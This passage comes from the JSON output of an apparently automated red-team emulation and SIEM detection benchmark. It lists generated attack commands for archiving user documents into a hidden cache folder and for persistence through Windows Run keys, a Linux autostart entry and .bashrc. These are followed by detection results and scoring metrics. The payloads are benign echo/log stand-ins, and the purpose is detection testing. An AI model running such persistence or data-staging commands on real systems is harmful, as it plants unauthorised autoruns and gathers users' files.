      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "697dffe1-669f-408c-83a0-85d97891d20d",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "mkdir -p $HOME/.cache && tar --exclude='*.tmp' -C $HOME -cf $HOME/.cache/backup.tar Documents Projects | gzip > $HOME/.cache/backup.tar.gz && rm -f $HOME/.cache/backup.tar",
      "description": "Advanced: Selectively archives multiple directories with exclusion rules, compresses, and cleans up intermediate file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a directory in .cache, archives Documents and Projects folders excluding temporary files, compresses the archive, and removes the uncompressed version",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.312604",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "9945c137-fe02-4caf-a985-cee2aa34c45a",
      "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"cmd.exe /c echo Test Update & pause\" /f",
      "description": "Adds a basic persistence entry in the current user's Run key to execute a benign command on login.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Command adds a registry value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. The specified command will run when the user logs in. No actual malware is executed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275368",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "1a86ccce-6028-417c-a90a-87c97a7a95d2",
      "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemSync\" /t REG_SZ /d \"cmd.exe /c echo Syncing system... > %TEMP%\\sync.log\" /f",
      "description": "Adds a persistence entry in the local machine Run key to execute a benign command at system startup.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Command adds a registry value under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. The command will run at system startup for all users. Requires administrator privileges. Creates a log file in %TEMP%. Safe for testing.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275368",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "dcae10c3-1339-47c2-a352-947fd7c4da8a",
      "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\\\_startup' -ErrorAction SilentlyContinue; $payload = 'echo Persistence test via registry >> %TEMP%\\\\_startup\\\\test.log'; Set-Content -Path '$env:TEMP\\\\_startup\\\\run.bat' -Value $payload -Force; reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v 'UpdateHelper' /t REG_SZ /d '$env:TEMP\\\\_startup\\\\run.bat' /f\"",
      "description": "Creates a batch script in a temporary directory and registers it in the current user's Run key for persistence.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a directory and batch file in %TEMP% that appends a message to a log file. Adds a registry Run key to execute the batch file on user login. The script runs silently during login. Safe for isolated testing.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275368",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "bf6d68c3-69fa-4a77-a875-08e6fa21571e",
      "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "mkdir -p ~/.config/autostart && echo '[Desktop Entry]\\nType=Application\\nExec=sh -c \\\"sleep 30 && echo \\\\\\\"Hello from autostart\\\\\\\" >> ~/persistence_test.log\\\"\\nHidden=false\\nNoDisplay=false\\nX-GNOME-Autostart-enabled=true\\nName=TestAutostart' > ~/.config/autostart/test-autostart.desktop",
      "description": "Creates a desktop entry in user autostart directory to simulate Registry Run Key persistence on Linux desktop environments",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A desktop entry is created that runs a command on user login, appending a test message to a log file after a delay. This mimics persistence via autostart mechanisms in Linux.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.021912",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "80ec2d6e-10d1-48b7-b808-2a836f917fef",
      "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'if [ -f ~/persistence_marker ]; then echo \\\"Persistent session active\\\" >> ~/persistence_log.txt; fi' >> ~/.bashrc",
      "description": "Appends a conditional execution block to ~/.bashrc to simulate persistence via shell configuration",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "On each new shell session, the user's .bashrc checks for a marker file and logs a message if present. This emulates a persistent execution trigger similar to Run Keys.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.021912",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.623,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "15c89d1f-75c6-449d-8a6c-1893d8f6758b",
      "ttp_id": "T1059",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 343.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "d74e2ed1-19a9-4180-bd1c-a6b1c464d697",
      "ttp_id": "T1014",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 1843.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "fff3d4dc-bdfd-42a1-a5cd-d281bc582de3",
      "ttp_id": "T1059.001",
      "detected": true,
      "events_found": 24,
      "query_time_ms": 691.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "89972886-fdae-497f-97e8-a441de008911",
      "ttp_id": "T1620",
      "detected": true,
      "events_found": 24,
      "query_time_ms": 746.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6c2fa3dc-5728-43ba-989d-f83ac6cfb88b",
      "ttp_id": "T1113",
      "detected": true,
      "events_found": 20,
      "query_time_ms": 255.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "7d137ceb-9a3f-4252-87e4-054a84eb169a",
      "ttp_id": "T1083",
      "detected": true,
      "events_found": 32,
      "query_time_ms": 710.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a3d0d0e5-8f42-4d33-b7d5-10cac11400cd",
      "ttp_id": "T1027",
      "detected": true,
      "events_found": 92,
      "query_time_ms": 24847.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "3c8081a5-5ea3-4692-8454-299adc0cfef1",
      "ttp_id": "T1592",
      "detected": true,
      "events_found": 100,
      "query_time_ms": 541.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a0fe41b7-d07b-47cb-a843-39d88f334294",
      "ttp_id": "T1190",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 359.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "83e01888-2900-4a82-b717-9c087909cddf",
      "ttp_id": "T1059.003",
      "detected": true,
      "events_found": 21,
      "query_time_ms": 821.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "74103df8-373b-4e9e-bd43-8a81980cc36f",
      "ttp_id": "T1082",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 997.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b1044af7-f7cb-453e-a6f9-57026f01df93",
      "ttp_id": "T1574.002",
      "detected": true,
      "events_found": 23,
      "query_time_ms": 1002.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ec522ca5-7528-4156-baac-2234be165412",
      "ttp_id": "T1564.003",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 526.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "0fe22702-355e-468c-8a4b-d1845adf4a53",
      "ttp_id": "T1036",
      "detected": true,
      "events_found": 42,
      "query_time_ms": 1186.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "cc30996d-b13d-4827-8a9e-bf99b99d6c04",
      "ttp_id": "T1041",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 782.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "eb25deb5-29f4-4af4-bfcd-3104e693d372",
      "ttp_id": "T1588.003",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 475.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d17c4191-8ddf-430f-9a96-77b85b2c6037",
      "ttp_id": "T1569.002",
      "detected": true,
      "events_found": 3,
      "query_time_ms": 544.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "8814460d-b81f-47bd-87a3-d8533650b55a",
      "ttp_id": "T1112",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 450.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6d01e36a-a185-49d1-bfd4-312789789853",
      "ttp_id": "T1497",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 654.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "eeec3c3f-2637-41ae-af1d-d6edf746c535",
      "ttp_id": "T1046",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 569.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a47c6b3f-3050-4a7a-82d4-2276e1ef342e",
      "ttp_id": "T1564.004",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 874.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4257fae7-c4f0-4cac-b0ac-18983ea43cf6",
      "ttp_id": "T1086",
      "detected": true,
      "events_found": 27,
      "query_time_ms": 495.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ba105b9a-1c3b-4e1b-aa7a-32d3dac235cb",
      "ttp_id": "T1204",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 655.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "64fb9a83-13ca-4b92-a03d-4ad494c41bb6",
      "ttp_id": "T1215",
      "detected": true,
      "events_found": 3,
      "query_time_ms": 722.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f12db906-671f-4056-8b4b-4afae0442ea3",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 23,
      "query_time_ms": 359.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "e014b2a5-b909-455c-9e08-0c63c0f7d742",
      "ttp_id": "T1542",
      "detected": true,
      "events_found": 82,
      "query_time_ms": 419.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d59b7e4d-a7f1-4922-af01-871bc0b15ebb",
      "ttp_id": "T1070",
      "detected": true,
      "events_found": 24,
      "query_time_ms": 3341.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "bb15d553-3a5c-40c5-9b58-b54ceb0b56de",
      "ttp_id": "T1543",
      "detected": true,
      "events_found": 24,
      "query_time_ms": 423.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "af85c73a-0128-4d07-add8-490bf128bc76",
      "ttp_id": "T1071",
      "detected": true,
      "events_found": 27,
      "query_time_ms": 502.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "333e5bee-e0ab-4c0a-bc72-f5d305a8bff6",
      "ttp_id": "T1560",
      "detected": true,
      "events_found": 6,
      "query_time_ms": 536.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "dc90d6d3-71fd-4343-8e96-592d4af8ebe7",
      "ttp_id": "T1547.001",
      "detected": true,
      "events_found": 3,
      "query_time_ms": 595.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 25,
    "false_positives": 0,
    "false_negatives": 6,
    "precision": 1.0,
    "detection_rate": 0.8064516129032258,
    "f1_score": 0.8928571428571428
  },
  "iterations": 1,
  "final_score": 0.8169354838709678,
  "final_report": {
    "total_ttps": 50,
    "optimized_ttps": 31,
    "generated_rules": 31,
    "generated_attacks": 147,
    "timestamp": "2025-12-28T20:00:27.024768"
  },
  "timestamp": "2025-12-28T20:00:27.041968",
  "benchmark_metrics": {
    "duration_s": 1562.9945495128632,
    "quality_score": 0.7156407401670346
  }
}